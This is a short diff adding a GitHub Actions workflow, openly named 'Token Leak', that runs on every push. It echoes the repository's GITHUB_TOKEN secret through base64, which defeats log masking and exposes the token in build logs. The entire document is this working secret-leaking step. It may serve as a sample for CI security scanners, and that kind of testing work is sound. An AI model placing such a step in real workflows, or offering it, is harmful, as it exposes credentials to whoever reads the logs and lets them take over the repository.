@@ -1,0 +1,9 @@
+name: Token Leak
+on: [push]
+
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "${{ secrets.GITHUB_TOKEN }}" | base64
+      - run: echo "Done"
